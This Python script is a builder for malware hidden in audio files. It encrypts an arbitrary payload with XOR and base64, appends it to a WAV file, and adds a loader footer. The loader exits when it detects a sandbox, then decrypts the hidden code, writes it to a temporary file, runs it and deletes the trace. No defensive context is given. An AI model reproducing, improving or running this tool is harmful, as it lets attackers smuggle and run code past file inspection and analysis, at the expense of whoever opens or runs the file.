import base64
import random
import struct
import tempfile
import subprocess
import os

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def fix_riff_chunk_size(wav_bytes: bytes) -> bytes:
    fixed_size = len(wav_bytes) - 8
    return wav_bytes[:4] + struct.pack('<I', fixed_size) + wav_bytes[8:]

def generate_polyglot_wav(wav_path: str, payload_path: str, output_path: str, xor_key: bytes = None):
    with open(payload_path, "r") as f:
        payload_code = f.read()

    key = xor_key if xor_key else bytes([random.randint(1, 255) for _ in range(8)])
    encrypted_payload = xor_encrypt(payload_code.encode(), key)
    encrypted_b64 = base64.b64encode(encrypted_payload).decode()
    key_repr = repr(key)

    with open(wav_path, "rb") as wav:
        wav_data = wav.read()

    fixed_wav = fix_riff_chunk_size(wav_data)

    python_footer = f'''
#POLYGLOT_START
import base64
import tempfile
import subprocess
import os

def xor_decrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def is_sandbox():
    try:
        import psutil
        if len(psutil.pids()) < 50:
            return True
    except ImportError:
        pass
    return False

if is_sandbox():
    exit()

with open(__file__, "rb") as f:
    f.seek(0, 2)
    size = f.tell()
    f.seek(size - 16)
    marker = f.read(16)
    if marker != b"<<POLYMARKER>>\n":
        exit()
    f.seek(size - 16 - {len(encrypted_b64)})
    enc = f.read({len(encrypted_b64)})
    dec = xor_decrypt(base64.b64decode(enc), {key_repr})
    with tempfile.NamedTemporaryFile("w", delete=False, suffix=".py") as tmp:
        tmp.write(dec.decode())
        tmp_path = tmp.name

subprocess.run(["python3", tmp_path])
os.unlink(tmp_path)
'''.strip().encode()

    with open(output_path, "wb") as out:
        out.write(fixed_wav)
        out.write(b"\n" + base64.b64encode(encrypted_payload))
        out.write(b"\n<<POLYMARKER>>\n")
        out.write(python_footer)

    print(f"✅ Polyglot WAV created: {output_path}")

# Example usage (replace these with argparse if desired):
# generate_polyglot_wav("input.wav", "payload.py", "polyglot_final.wav")
